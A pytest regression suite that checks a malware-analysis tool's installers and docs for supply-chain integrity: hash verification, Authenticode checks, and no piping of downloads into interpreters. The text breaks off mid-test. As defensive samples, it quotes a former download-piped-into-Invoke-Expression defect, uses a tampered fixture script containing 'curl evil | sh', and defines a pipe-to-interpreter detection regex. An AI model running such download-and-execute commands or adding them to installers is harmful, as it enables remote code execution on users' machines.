"""
Supply-chain integrity regression tests for the installers (audit finding F-3).

install.ps1 declares `#Requires -RunAsAdministrator` and drops code onto a
malware analyst's machine - including obsidian.dp64, which x64dbg loads into
the process that debugs live malware. Before F-3 neither installer verified a
single byte it downloaded: TLS proved *who served* the bytes, never *which*
bytes were served, so a tampered CDN copy, a swapped release asset, or an
interception proxy meant code execution as Administrator.

install.ps1 cannot be executed in CI (no Windows, no PowerShell), so its half
of this file is a static analysis of the script text: the properties asserted
are the ones whose loss would reintroduce the finding - no piping a freshly
downloaded script into an interpreter, no raw download outside the verifying
wrapper, and a hash assertion on every project-owned release asset. install.py
IS importable, so its half exercises the real verification helpers.

The assertions deliberately key on structure (which function a call sits in,
which helper is invoked) rather than exact formatting, so reformatting the
installers does not fail the suite but removing a check does.
"""

import ast
import os
import re
import shutil
import tempfile
from pathlib import Path

import pytest

import install

REPO_ROOT = Path(__file__).resolve().parent.parent
PS1_PATH = REPO_ROOT / "install.ps1"
PY_PATH = REPO_ROOT / "install.py"
INSTALL_MD_PATH = REPO_ROOT / "INSTALL.md"


# Helpers for reading install.ps1 as text


def read_ps1() -> str:
    return PS1_PATH.read_text(encoding="utf-8", errors="replace")


def strip_ps1_comments(text: str) -> str:
    """Remove <# block #> and # line comments so assertions about code are not
    satisfied (or tripped) by prose. Crude but adequate: install.ps1 has no '#'
    inside string literals that would matter here."""
    text = re.sub(r"<#.*?#>", "", text, flags=re.DOTALL)
    out = []
    for line in text.splitlines():
        stripped = line.strip()
        if stripped.startswith("#"):
            continue
        out.append(line)
    return "\n".join(out)


def ps1_function_body(text: str, name: str) -> str:
    """Return the source of a top-level `function <name> {` from install.ps1.

    Every function in install.ps1 starts at column 0, so the body runs from the
    declaration to the next column-0 `function` (or end of file).
    """
    lines = text.splitlines()
    start = None
    for i, line in enumerate(lines):
        if re.match(rf"^function\s+{re.escape(name)}\b", line):
            start = i
            break
    assert start is not None, f"install.ps1 no longer defines function {name}"

    for j in range(start + 1, len(lines)):
        if re.match(r"^function\s+\S", lines[j]):
            return "\n".join(lines[start:j])
    return "\n".join(lines[start:])


# install.ps1: no unverified remote code execution


def test_ps1_never_pipes_a_download_into_invoke_expression():
    """The original defect at install.ps1:562 was

        Invoke-RestMethod https://astral.sh/uv/install.ps1 | Invoke-Expression

    i.e. a nested curl|iex inside an elevated installer. Nothing downloaded may
    be piped into Invoke-Expression / iex again.
    """
    code = strip_ps1_comments(read_ps1())

    offenders = [
        line.strip()
        for line in code.splitlines()
        if re.search(r"\|\s*(Invoke-Expression|iex)\b", line, re.IGNORECASE)
    ]
    assert not offenders, (
        "install.ps1 pipes something into Invoke-Expression again: " + "; ".join(offenders)
    )

    # And the specific regression: no `iex`/`Invoke-Expression` anywhere near a URL.
    assert not re.search(
        r"(Invoke-Expression|iex)\b[^\n]*https?://", code, re.IGNORECASE
    ), "install.ps1 executes a URL's contents directly"


def test_ps1_uv_installer_is_downloaded_verified_then_executed():
    """uv must be installed from a file that went through Invoke-VerifiedDownload,
    executed with -File rather than by interpreting a network response."""
    body = ps1_function_body(read_ps1(), "Install-UV")

    assert "Invoke-VerifiedDownload" in body, "Install-UV no longer verifies the uv installer"
    assert "https://astral.sh/uv/install.ps1" in body
    assert re.search(r"-HashKey\s+\"uv-installer-ps1\"", body), (
        "Install-UV must pass a HashKey so an operator can pin the uv installer"
    )
    assert "-File $uvInstaller" in body, (
        "Install-UV should execute the verified file on disk, not a piped stream"
    )


def test_ps1_all_downloads_go_through_the_verifying_wrapper():
    """`Invoke-WebRequest` is what writes remote bytes to disk. It may only
    appear inside Invoke-VerifiedDownload (which hashes what it fetched) or
    Get-ReleaseChecksumMap (which fetches the checksum manifest itself - text
    that is parsed, never executed, and whose authority is the release it is
    published in). Anywhere else is a download nobody verified."""
    text = read_ps1()
    code = strip_ps1_comments(text)

    allowed = ("Invoke-VerifiedDownload", "Get-ReleaseChecksumMap")
    allowed_bodies = [strip_ps1_comments(ps1_function_body(text, name)) for name in allowed]

    for line in code.splitlines():
        if "Invoke-WebRequest" not in line:
            continue
        assert any(line in body for body in allowed_bodies), (
            f"install.ps1 downloads outside the verifying wrapper: {line.strip()}"
        )

    # Callers reach the network only through the wrapper.
    for func_name in ("Install-Ghidra", "Install-X64Dbg", "Install-WinDbg", "Install-BinaryMCP"):
        body = strip_ps1_comments(ps1_function_body(text, func_name))
        assert "Invoke-WebRequest" not in body, (
            f"{func_name} downloads directly instead of via Invoke-VerifiedDownload"
        )


# install.ps1: the hash assertion itself


def test_ps1_assert_filehash_uses_sha256_deletes_and_throws():
    text = read_ps1()
    body = ps1_function_body(text, "Assert-FileHash")
    # Hashing itself lives in the Get-FileSha256 helper.
    hashing = body + "\n" + ps1_function_body(text, "Get-FileSha256")

    assert re.search(r"Get-FileHash[^\n]*-Algorithm\s+SHA256", hashing), (
        "Assert-FileHash must hash with SHA-256"
    )
    # Get-FileHash returns uppercase, manifests are usually lowercase.
    assert "OrdinalIgnoreCase" in body, "hash comparison must be case-insensitive"
    assert "Remove-Item" in body, "a file that failed verification must be deleted"
    assert "throw" in body, "a hash mismatch must be fatal, not a warning"

    # The error has to name both values or it is not actionable.
    mismatch_message = body[body.index("mismatch"):]
    assert "expected" in mismatch_message and "got" in mismatch_message


def test_ps1_unverified_downloads_warn_loudly_and_can_be_made_fatal():
    text = read_ps1()
    warn_body = ps1_function_body(text, "Write-UnverifiedArtifactWarning")

    assert "UNVERIFIED DOWNLOAD" in warn_body, "the warning must be unmissable"
    assert "Write-Warn" in warn_body
    # It must print the digest actually downloaded, so the operator can pin it.
    assert "Get-FileSha256" in warn_body
    assert "Get-IntegrityEnvName" in warn_body
    # ... and strict mode must escalate it to a failure.
    assert "Test-StrictIntegrity" in warn_body
    assert "throw" in warn_body

    assert "$StrictIntegrity" in text, "install.ps1 must expose a -StrictIntegrity switch"
    assert "BINARY_MCP_STRICT_INTEGRITY" in text


def test_ps1_verified_download_verifies_or_warns_every_time():
    body = ps1_function_body(read_ps1(), "Invoke-VerifiedDownload")

    assert "Assert-FileHash" in body
    assert "Write-UnverifiedArtifactWarning" in body
    assert "Get-PinnedSha256" in body, "an operator-supplied pin must be honoured"


# install.ps1: the project's own release assets


def test_ps1_project_owned_assets_are_hash_checked_against_release_manifest():
    """obsidian.dp64/.dp32/obsidian_server.exe are OUR release assets, loaded by
    x64dbg next to live malware. They must be verified against the SHA256SUMS
    manifest published with the release, and must never be written straight into
    the x64dbg plugins directory unverified."""
    text = read_ps1()
    body = ps1_function_body(text, "Install-X64Dbg")

    assert "Get-ReleaseChecksumMap" in body, (
        "plugin install must consult the release checksum manifest"
    )
    assert "Invoke-VerifiedDownload" in body

    # The pre-fix code downloaded straight to the plugins directory.
    for bad in (
        r"-OutFile\s+\"\$plugin64Dir",
        r"-OutFile\s+\"\$plugin32Dir",
    ):
        assert not re.search(bad, body), (
            "plugin binaries are downloaded directly into the x64dbg plugins "
            "directory without staging/verification"
        )

    # Each artifact ends up in the plugins dir only via a copy from staging.
    for name in ("obsidian.dp64", "obsidian.dp32", "obsidian_server.exe"):
        assert re.search(rf"Copy-Item[^\n]*{re.escape(name)}", body), (
            f"{name} should be copied from the verified staging directory"
        )


def test_ps1_checks_authenticode_where_a_signature_is_expected():
    text = read_ps1()
    helper = ps1_function_body(text, "Assert-AuthenticodeValid")

    assert "Get-AuthenticodeSignature" in helper
    assert re.search(r"\$sig\.Status\s+-eq\s+'Valid'", helper), (
        "Authenticode check must test for Status -eq 'Valid'"
    )
    # Warning, not fatal, while our own release assets are unsigned.
    assert "AllowUnsigned" in helper
    assert "Write-Warn" in helper

    # Wired up at the call sites that matter: our plugin binaries, and the
    # Microsoft-signed Windows SDK bootstrapper that is then run elevated.
    assert "Assert-AuthenticodeValid" in ps1_function_body(text, "Install-X64Dbg")
    windbg = ps1_function_body(text, "Install-WinDbg")
    assert "Assert-AuthenticodeValid" in windbg
    assert "Microsoft Corporation" in windbg


def test_ps1_third_party_artifacts_have_overridable_pins():
    """Ghidra / x64dbg-snapshot / the SDK bootstrapper have no publishable fixed
    digest, so the plumbing must at least be there and operator-overridable."""
    text = read_ps1()

    assert "BINARY_MCP_SHA256_" in text, "no env-var override for pinned hashes"
    assert "$script:PinnedSha256" in text

    for key in ("ghidra-zip", "x64dbg-snapshot", "windows-sdk-setup", "repo-zip"):
        assert f"'{key}'" in text, f"missing pinnable hash key {key}"

    ghidra = ps1_function_body(text, "Install-Ghidra")
    assert re.search(r"-HashKey\s+\"ghidra-zip\"", ghidra)
    x64dbg = ps1_function_body(text, "Install-X64Dbg")
    assert re.search(r"-HashKey\s+\"x64dbg-snapshot\"", x64dbg)


# install.py: static structure


def _py_tree() -> ast.Module:
    return ast.parse(PY_PATH.read_text(encoding="utf-8"))


def _enclosing_function(tree: ast.Module, node: ast.AST) -> str:
    """Name of the function definition containing `node` (or '<module>')."""
    for func in ast.walk(tree):
        if isinstance(func, (ast.FunctionDef, ast.AsyncFunctionDef)):
            for child in ast.walk(func):
                if child is node:
                    return func.name
    return "<module>"


def _called_names(node: ast.AST) -> set:
    names = set()
    for child in ast.walk(node):
        if isinstance(child, ast.Call):
            func = child.func
            if isinstance(func, ast.Name):
                names.add(func.id)
            elif isinstance(func, ast.Attribute):
                names.add(func.attr)
    return names


def test_py_never_executes_a_downloaded_script_without_verification():
    """install.py fetched dot.net/v1/dotnet-install.sh and astral.sh/uv/install.sh
    to a temp file and handed them to bash/sh unverified. Any function that
    still runs a shell script must obtain it via download_and_verify_script."""
    tree = _py_tree()

    interpreters = {"sh", "bash", "zsh", "python", "python3", "powershell", "pwsh"}
    checked_any = False

    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        is_run = (isinstance(func, ast.Attribute) and func.attr == "run") or (
            isinstance(func, ast.Name) and func.id in ("run_command",)
        )
        if not is_run or not node.args:
            continue
        first = node.args[0]
        if not isinstance(first, (ast.List, ast.Tuple)) or not first.elts:
            continue
        head = first.elts[0]
        if not (isinstance(head, ast.Constant) and head.value in interpreters):
            continue

        # An interpreter invoked with a variable argument: that argument has to
        # be a script this module downloaded AND verified.
        enclosing = _enclosing_function(tree, node)
        func_node = next(
            f for f in ast.walk(tree)
            if isinstance(f, ast.FunctionDef) and f.name == enclosing
        )
        assert "download_and_verify_script" in _called_names(func_node), (
            f"{enclosing}() runs {head.value} on a script it did not verify"
        )
        checked_any = True

    assert checked_any, (
        "expected install.py to still run downloaded installer scripts; "
        "update this test if that changed"
    )


def test_py_network_reads_are_confined_to_verified_helpers():
    """urlopen() anywhere else means a new download path that skipped the
    hashing wrapper."""
    tree = _py_tree()
    allowed = {
        "download_file",              # hashes or loudly warns
        "download_and_verify_script",  # hashes or loudly warns, before exec
        "fetch_github_release",       # JSON metadata, never executed
        "release_checksum_map",       # the checksum manifest itself
    }

    for node in ast.walk(tree):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            if node.func.id == "urlopen":
                enclosing = _enclosing_function(tree, node)
                assert enclosing in allowed, (
                    f"install.py downloads in {enclosing}(), outside the verified helpers"
                )


def test_py_ghidra_and_repo_downloads_pass_a_hash_key():
    """download_file() only verifies when it is told what to verify against."""
    tree = _py_tree()
    seen_keys = set()

    for node in ast.walk(tree):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            if node.func.id != "download_file":
                continue
            kwargs = {kw.arg for kw in node.keywords}
            assert "hash_key" in kwargs, (
                f"download_file() call on line {node.lineno} passes no hash_key, "
                "so the download can never be verified or pinned"
            )
            for kw in node.keywords:
                if kw.arg == "hash_key" and isinstance(kw.value, ast.Constant):
                    seen_keys.add(kw.value.value)

    assert {"ghidra-zip", "repo-zip"} <= seen_keys


# install.py: behaviour of the verification helpers


@pytest.fixture
def workdir():
    path = Path(tempfile.mkdtemp(prefix="installer-integrity-"))
    try:
        yield path
    finally:
        shutil.rmtree(path, ignore_errors=True)


@pytest.fixture(autouse=True)
def _clean_integrity_env(monkeypatch):
    """Never let a real BINARY_MCP_* env var leak into these tests."""
    for key in list(os.environ):
        if key.startswith("BINARY_MCP_"):
            monkeypatch.delenv(key, raising=False)


def test_verify_sha256_accepts_a_matching_digest_case_insensitively(workdir):
    target = workdir / "artifact.bin"
    target.write_bytes(b"plugin-bytes")
    digest = install.sha256_file(target)

    install.verify_sha256(target, digest.upper(), "artifact")
    assert target.exists()


def test_verify_sha256_deletes_the_file_and_raises_on_mismatch(workdir):
    target = workdir / "artifact.bin"
    target.write_bytes(b"tampered-plugin")
    actual = install.sha256_file(target)

    with pytest.raises(ValueError) as excinfo:
        install.verify_sha256(target, "0" * 64, "obsidian.dp64")

    # Expected AND actual must both be in the message or it is not actionable.
    message = str(excinfo.value)
    assert "obsidian.dp64" in message
    assert "0" * 64 in message
    assert actual in message
    assert not target.exists(), (
        "a file that failed verification must not be left on disk where it "
        "could still be loaded or executed"
    )


def test_verify_sha256_rejects_a_malformed_expected_digest(workdir):
    target = workdir / "artifact.bin"
    target.write_bytes(b"x")

    with pytest.raises(ValueError):
        install.verify_sha256(target, "not-a-digest", "artifact")
    assert not target.exists()


def test_warn_unverified_reports_the_digest_and_how_to_pin_it(workdir, capsys):
    target = workdir / "ghidra.zip"
    target.write_bytes(b"ghidra")
    digest = install.sha256_file(target)

    install.warn_unverified(target, "Ghidra 11.0", "ghidra-zip", "https://example/ghidra.zip")

    out = capsys.readouterr().out
    assert "UNVERIFIED DOWNLOAD" in out
    assert digest in out
    assert "BINARY_MCP_SHA256_GHIDRA_ZIP" in out
    assert target.exists(), "warning alone must not delete the artifact"


def test_strict_integrity_turns_an_unverified_download_into_a_failure(workdir, monkeypatch):
    monkeypatch.setenv("BINARY_MCP_STRICT_INTEGRITY", "1")
    target = workdir / "ghidra.zip"
    target.write_bytes(b"ghidra")

    with pytest.raises(ValueError):
        install.warn_unverified(target, "Ghidra 11.0", "ghidra-zip", "https://example/ghidra.zip")
    assert not target.exists()


def test_pinned_hash_env_var_overrides_the_in_script_table(monkeypatch):
    assert install.pinned_sha256("ghidra-zip") is None
    monkeypatch.setenv("BINARY_MCP_SHA256_GHIDRA_ZIP", "ab" * 32)
    assert install.pinned_sha256("ghidra-zip") == "ab" * 32


def test_integrity_env_name_normalises_asset_names():
    assert install.integrity_env_name("uv-installer-sh") == "BINARY_MCP_SHA256_UV_INSTALLER_SH"
    assert (
        install.integrity_env_name("binary-mcp-obsidian.dp64")
        == "BINARY_MCP_SHA256_BINARY_MCP_OBSIDIAN_DP64"
    )


def test_download_file_verifies_against_a_pinned_hash(workdir, monkeypatch):
    """End-to-end over file:// - a pinned digest that does not match must fail
    the install rather than return a quiet False."""
    source = workdir / "source.bin"
    source.write_bytes(b"authentic-release-asset")
    dest = workdir / "downloaded.bin"

    monkeypatch.setenv("BINARY_MCP_SHA256_GHIDRA_ZIP", install.sha256_file(source))
    assert install.download_file(source.as_uri(), dest, "asset", hash_key="ghidra-zip")
    assert dest.read_bytes() == b"authentic-release-asset"

    monkeypatch.setenv("BINARY_MCP_SHA256_GHIDRA_ZIP", "cd" * 32)
    with pytest.raises(ValueError):
        install.download_file(source.as_uri(), dest, "asset", hash_key="ghidra-zip")
    assert not dest.exists()


def test_download_and_verify_script_returns_a_verified_path(workdir, monkeypatch):
    source = workdir / "install.sh"
    source.write_text("#!/bin/sh\necho hi\n")
    monkeypatch.setenv("BINARY_MCP_SHA256_UV_INSTALLER_SH", install.sha256_file(source))

    script = install.download_and_verify_script(
        source.as_uri(), "uv installer script", "uv-installer-sh"
    )
    try:
        assert script.read_text() == "#!/bin/sh\necho hi\n"
    finally:
        script.unlink(missing_ok=True)


def test_download_and_verify_script_refuses_a_tampered_script(workdir, monkeypatch):
    source = workdir / "install.sh"
    source.write_text("#!/bin/sh\ncurl evil | sh\n")
    monkeypatch.setenv("BINARY_MCP_SHA256_UV_INSTALLER_SH", "ef" * 32)
    # Land the temp copy inside workdir so the cleanup assertion below is exact.
    monkeypatch.setattr(tempfile, "tempdir", str(workdir))

    with pytest.raises(ValueError):
        install.download_and_verify_script(
            source.as_uri(), "uv installer script", "uv-installer-sh"
        )

    leftovers = [p for p in workdir.glob("*.sh") if p != source]
    assert not leftovers, (
        "a script that failed verification must not be left in the temp directory, "
        "where it could still be handed to sh"
    )


def test_release_checksum_map_parses_a_published_sha256sums(workdir):
    asset = workdir / "obsidian.dp64"
    asset.write_bytes(b"plugin")
    digest = install.sha256_file(asset)

    manifest = workdir / "SHA256SUMS"
    manifest.write_text(
        "# binary-mcp release checksums\n"
        f"{digest}  obsidian.dp64\n"
        f"{'11' * 32} *obsidian_server.exe\n"
    )

    release = {
        "assets": [
            {"name": "SHA256SUMS", "browser_download_url": manifest.as_uri()},
            {"name": "obsidian.dp64", "browser_download_url": asset.as_uri()},
        ]
    }

    checksums = install.release_checksum_map(release)
    assert checksums["obsidian.dp64"] == digest
    assert checksums["obsidian_server.exe"] == "11" * 32
    assert install.release_asset_checksum(release, "obsidian.dp64", checksums) == digest


def test_release_checksum_map_parses_a_single_digest_sha256_asset(workdir):
    manifest = workdir / "ghidra.zip.sha256"
    manifest.write_text("22" * 32 + "\n")

    release = {
        "assets": [
            {"name": "ghidra.zip.sha256", "browser_download_url": manifest.as_uri()},
        ]
    }
    assert install.release_checksum_map(release)["ghidra.zip"] == "22" * 32


def test_checksum_from_release_notes_only_accepts_a_nearby_digest():
    release = {
        "body": (
            "## Release\n"
            "ghidra_11.3_PUBLIC.zip\n"
            f"SHA-256: {'33' * 32}\n"
            "\n"
            "Unrelated section\n"
            f"{'44' * 32}\n"
        )
    }
    assert (
        install.checksum_from_release_notes(release, "ghidra_11.3_PUBLIC.zip") == "33" * 32
    )
    assert install.checksum_from_release_notes(release, "not_mentioned.zip") is None


# INSTALL.md documents the risk


def test_install_md_documents_the_curl_pipe_interpreter_risk():
    text = INSTALL_MD_PATH.read_text(encoding="utf-8")

    assert "Supply-Chain Integrity" in text
    # The pattern is named, and an alternative is given with real commands.
    assert "| iex" in text or "irm" in text
    assert "sha256sum" in text
    assert "Get-FileHash" in text
    assert "-OutFile" in text
    # Pinning and strict mode are discoverable from the docs.
    assert "BINARY_MCP_SHA256_" in text
    assert "StrictIntegrity" in text
    assert "BINARY_MCP_STRICT_INTEGRITY" in text


def test_install_md_no_longer_advertises_a_bare_pipe_to_interpreter_install():
    """The quick-start used to lead with `curl ... | python3 -` and `irm ... | iex`
    for this project's own installers."""
    text = INSTALL_MD_PATH.read_text(encoding="utf-8")

    for pattern in (
        r"curl[^\n]*raw\.githubusercontent\.com[^\n]*\|\s*python3",
        r"irm[^\n]*raw\.githubusercontent\.com[^\n]*\|\s*iex",
    ):
        assert not re.search(pattern, text), (
            f"INSTALL.md still recommends piping this project's installer into an "
            f"interpreter ({pattern})"
        )


# ---------------------------------------------------------------------------
# F-3, second pass.
#
# The first remediation pass left the finding only partly closed. The tests
# below pin the specific things that were still broken afterwards, so each one
# fails if that exact regression comes back:
#
#   * release.yml published no checksum manifest, which made every "verify the
#     plugin against SHA256SUMS" code path in install.ps1 dead code;
#   * README.md still led with `irm ... | iex` / `curl ... | python3 -`;
#   * Install-UV stripped the Mark-of-the-Web from an *unverified* download;
#   * the Authenticode result on the elevated Windows SDK bootstrapper was
#     discarded with `| Out-Null`, so a bad signature did not stop it running;
#   * failure paths left downloaded scripts/installers on disk.
# ---------------------------------------------------------------------------

RELEASE_WORKFLOW_PATH = REPO_ROOT / ".github" / "workflows" / "release.yml"
README_PATH = REPO_ROOT / "README.md"

PROJECT_OWNED_ASSETS = ("obsidian.dp64", "obsidian.dp32", "obsidian_server.exe")

# A download command whose output is piped straight into an interpreter. Only
# matches when a URL is on the same line, so prose *about* the anti-pattern
# ("no `| iex` one-liner is offered") does not trip it.
PIPE_TO_INTERPRETER = re.compile(
    r"(curl|wget|irm|iwr|Invoke-RestMethod|Invoke-WebRequest)\b[^\n|]*https?://[^\n|]*\|"
    r"\s*(iex|Invoke-Expression|sh|bash|zsh|python3?|pwsh|powershell)\b",
    re.IGNORECASE,
)


def test_release_workflow_publishes_a_sha256sums_manifest():
    """Without this step the whole SHA256SUMS code path in install.ps1 is dead
    code: the installer looks for a manifest that is never published, finds
    nothing, and installs obsidian.dp64 unverified. This is the step that makes
    the verification real."""
    text = RELEASE_WORKFLOW_PATH.read_text(encoding="utf-8")

    assert "sha256sum" in text, "release.yml computes no SHA-256 for its assets"
    assert "SHA256SUMS" in text, "release.yml publishes no SHA256SUMS manifest"

    # The manifest has to cover every project-owned asset the installers fetch,
    # and be uploaded with the release - computing it and not shipping it would
    # be just as inert.
    manifest_step = text[text.index("Generate SHA256SUMS Manifest"):]
    for asset in PROJECT_OWNED_ASSETS:
        assert asset in manifest_step, (
            f"the SHA256SUMS step does not hash {asset}, so install.ps1 cannot "
            f"verify it"
        )

    upload = text[text.index("softprops/action-gh-release"):]
    assert "SHA256SUMS" in upload, (
        "SHA256SUMS is generated but never uploaded as a release asset, so the "
        "installers can never fetch it"
    )
    for asset in PROJECT_OWNED_ASSETS:
        assert asset in upload, f"{asset} is no longer published with the release"


def test_release_workflow_manifest_is_named_and_shaped_so_installers_read_it(workdir):
    """A manifest the installers do not recognise is published but never read -
    which looks like a fix and behaves like the bug. Check the published name
    against the real parser, and check the format the workflow writes against it
    too."""
    text = RELEASE_WORKFLOW_PATH.read_text(encoding="utf-8")

    uploaded = text[text.index("softprops/action-gh-release"):]
    # Only the bare path entries under `files:`, not prose in a comment.
    names = {
        line.strip().split("/")[-1]
        for line in uploaded.splitlines()
        if re.match(r"^\s*\S*SHA256SUMS\S*\s*$", line)
    }
    assert names, "no SHA256SUMS asset is uploaded with the release"

    # The file the step writes and the file the release uploads must be the same
    # one: writing checksums.json and uploading SHA256SUMS ships nothing.
    step = text[text.index("Generate SHA256SUMS Manifest"):text.index("- name: Create Release Notes")]
    written = set(re.findall(r">\s*(\S+)", step)) | set(re.findall(r"sha256sum -c (\S+)", step))
    assert names & written, (
        f"release.yml uploads {sorted(names)} but the manifest step writes "
        f"{sorted(written)} - the published asset is not the file that was generated"
    )

    # Reproduce what release.yml writes: a '#' comment header followed by
    # coreutils "<hash>  <name>" lines, using bare basenames.
    digests = {name: f"{i:02x}" * 32 for i, name in enumerate(PROJECT_OWNED_ASSETS, start=1)}
    manifest = workdir / "manifest.txt"
    manifest.write_text(
        "# binary-mcp v1.2.3 release checksums (SHA-256)\n"
        "# Verify with: sha256sum -c SHA256SUMS\n"
        + "".join(f"{d}  {n}\n" for n, d in digests.items())
    )

    for name in names:
        parsed = install.release_checksum_map(
            {"assets": [{"name": name, "browser_download_url": manifest.as_uri()}]}
        )
        assert parsed == digests, (
            f"release.yml publishes the manifest as {name!r}; install.py's parser "
            f"read {parsed!r} from it instead of the expected digests"
        )
        # install.ps1's asset-name filter is a regex in PowerShell; mirror it
        # exactly so a rename that only one installer tolerates is caught.
        assert re.match(r"^(sha256sums?|checksums?)(\.txt)?$", name, re.IGNORECASE) or re.search(
            r"\.sha256$", name, re.IGNORECASE
        ), f"install.ps1 would not recognise {name!r} as a checksum manifest"


def test_release_workflow_fails_rather_than_publishing_a_partial_manifest():
    """install.ps1 aborts the plugin install when a manifest exists but omits an
    asset. A workflow that could publish a partial manifest would therefore
    break every install - and a missing entry is what a swapped asset looks
    like, so this must not be relaxed by silently tolerating it either."""
    text = RELEASE_WORKFLOW_PATH.read_text(encoding="utf-8")
    manifest_step = text[text.index("Generate SHA256SUMS Manifest"):]
    manifest_step = manifest_step[: manifest_step.index("- name: Create Release Notes")]

    assert "exit 1" in manifest_step, (
        "the SHA256SUMS step never fails, so an asset missing from the manifest "
        "would ship anyway"
    )
    assert "sha256sum -c" in manifest_step, (
        "the workflow should verify the manifest it just wrote against the files "
        "it is about to upload"
    )


def test_no_doc_pipes_a_project_installer_into_an_interpreter():
    """README.md:15/:18 kept leading the Quick Start with `irm ... | iex` and
    `curl ... | python3 -` after the first pass, and release.yml's release notes
    said the same thing - so every release told users to do the exact thing the
    installers were hardened against."""
    for path in (README_PATH, INSTALL_MD_PATH, RELEASE_WORKFLOW_PATH):
        text = path.read_text(encoding="utf-8")
        offenders = [
            line.strip()
            for line in text.splitlines()
            if PIPE_TO_INTERPRETER.search(line) and not line.lstrip().startswith("# Instead of")
        ]
        assert not offenders, (
            f"{path.name} pipes a fresh download into an interpreter: " + "; ".join(offenders)
        )


def test_readme_leads_with_download_inspect_run():
    """Not enough to delete the one-liner: the replacement has to actually show
    the inspect step, or users will reinvent the one-liner."""
    text = README_PATH.read_text(encoding="utf-8")
    quick_start = text[text.index("## Quick Start"):]

    assert "git clone" in quick_start
    assert "-OutFile" in quick_start, "no download-to-disk form for Windows"
    assert "sha256sum install.py" in quick_start or "Get-FileHash" in quick_start, (
        "README shows no way to record what was downloaded"
    )
    # The risk is stated where the reader is, not only behind a link.
    assert re.search(r"elevated|Administrator", quick_start)
    assert "INSTALL.md" in quick_start


def test_ps1_does_not_clear_mark_of_the_web_before_verification():
    """Unblock-File strips the Mark-of-the-Web, the flag Defender/SmartScreen and
    any EDR key off. Pass 1 called it unconditionally on the uv installer - a
    download that, with the pin table empty, was never verified - and then ran it
    via `powershell -ExecutionPolicy Bypass -File`. Destroying provenance on
    unverified, attacker-influenceable content is worse than never touching it.
    """
    text = read_ps1()
    body = strip_ps1_comments(ps1_function_body(text, "Install-UV"))

    assert "Unblock-File" in body, (
        "test out of date: Install-UV no longer calls Unblock-File at all"
    )

    lines = body.splitlines()
    unblock_idx = next(i for i, ln in enumerate(lines) if "Unblock-File" in ln)

    # The call must be guarded, and the guard must be the verification result -
    # not merely 'the download succeeded'.
    guard_window = "\n".join(lines[max(0, unblock_idx - 6):unblock_idx])
    assert re.search(r"if\s*\(\s*\$\w*[Vv]erified\s*\)", guard_window), (
        "Unblock-File is not guarded by an 'if (<verified>)' check; it would run "
        "on an unverified download"
    )

    # And that flag has to come from the verification helper, not be a local
    # $true someone set optimistically.
    assert re.search(r"\$\w*[Vv]erified\s*=\s*Test-VerificationResult", body), (
        "the guard flag does not come from Test-VerificationResult"
    )

    # Whole-file: no other unguarded Unblock-File crept in.
    all_unblocks = [ln for ln in strip_ps1_comments(text).splitlines() if "Unblock-File" in ln]
    assert len(all_unblocks) == 1, (
        "Unblock-File appears outside Install-UV; every call site needs the same "
        "verified-first guard: " + "; ".join(x.strip() for x in all_unblocks)
    )


def test_ps1_verified_download_reports_whether_it_actually_verified():
    """The guard above is only meaningful if Invoke-VerifiedDownload distinguishes
    'hash checked' from 'warned and carried on'. Pass 1 returned $true either
    way."""
    body = ps1_function_body(read_ps1(), "Invoke-VerifiedDownload")

    verified_branch = body[body.index("Assert-FileHash"):body.index("Write-UnverifiedArtifactWarning")]
    assert "return $true" in verified_branch, "the verified path must return $true"

    warned_branch = body[body.index("Write-UnverifiedArtifactWarning"):]
    assert "return $false" in warned_branch, (
        "the unverified path still reports success, so callers cannot tell "
        "whether anything was actually checked"
    )
    assert "return $true" not in warned_branch


def test_ps1_verification_result_helper_fails_closed():
    """Test-VerificationResult exists so a stray pipeline object cannot be
    mistaken for a boolean $true (any non-empty array is truthy in PowerShell)."""
    body = ps1_function_body(read_ps1(), "Test-VerificationResult")

    assert re.search(r"-is\s+\[bool\]", body), (
        "Test-VerificationResult does not require an actual [bool], so an "
        "unexpected pipeline object would read as 'verified'"
    )
    assert "-and" in body


def test_ps1_bad_authenticode_on_the_sdk_bootstrapper_aborts():
    """install.ps1:1317 piped Assert-AuthenticodeValid to Out-Null and then ran
    the bootstrapper elevated at :1321 regardless. A signature that is BAD (not
    merely absent) must stop Start-Process."""
    body = strip_ps1_comments(ps1_function_body(read_ps1(), "Install-WinDbg"))

    assert "Assert-AuthenticodeValid" in body
    assert not re.search(r"Assert-AuthenticodeValid[^\n]*\|\s*Out-Null", body), (
        "the Authenticode result on the elevated SDK bootstrapper is discarded "
        "again, so a bad signature does not stop the install"
    )

    lines = body.splitlines()
    sig_idx = next(i for i, ln in enumerate(lines) if "Assert-AuthenticodeValid" in ln)
    start_idx = next(i for i, ln in enumerate(lines) if "Start-Process" in ln)
    assert sig_idx < start_idx, "the signature check must precede execution"

    between = "\n".join(lines[sig_idx:start_idx])
    assert "throw" in between, (
        "nothing between the signature check and Start-Process aborts, so a bad "
        "signature still reaches an elevated execution"
    )
    assert "Test-VerificationResult" in between, (
        "the abort must be driven by the check's result, fail-closed"
    )

    # -AllowUnsigned must NOT be used here: winsdksetup.exe is always
    # Microsoft-signed, so 'no signature' is itself the anomaly.
    sig_call = "\n".join(lines[sig_idx:sig_idx + 3])
    assert "AllowUnsigned" not in sig_call, (
        "the Windows SDK bootstrapper is always Microsoft-signed; accepting an "
        "unsigned one defeats the check"
    )


def test_ps1_authenticode_treats_unknown_status_as_unknown_not_bad():
    """Get-AuthenticodeSignature dispatches on file extension and returns
    'UnknownError' for .dp64/.dp32 - meaning 'cannot evaluate', not 'invalid'.
    Pass 1 only exempted 'NotSigned', so under -StrictIntegrity the generic
    failure branch deleted a legitimate, hash-verified plugin and aborted."""
    # Comments stripped: a prose mention of UnknownError is not a code path.
    body = strip_ps1_comments(ps1_function_body(read_ps1(), "Assert-AuthenticodeValid"))

    guard = re.search(
        r"if\s*\([^)]*\$sig\.Status\s+-eq\s+'UnknownError'[^)]*\)", body
    )
    assert guard, (
        "Assert-AuthenticodeValid does not test for the 'UnknownError' status "
        "that .dp64/.dp32 always produce; -StrictIntegrity would delete a good, "
        "already hash-verified plugin"
    )
    assert "AllowUnsigned" in guard.group(0), (
        "'UnknownError' must only be tolerated where the caller already accepts "
        "an unsigned artifact - never for the elevated SDK bootstrapper"
    )

    # The exemption must return, i.e. skip the delete-and-throw branch below.
    exemption = body[guard.end():]
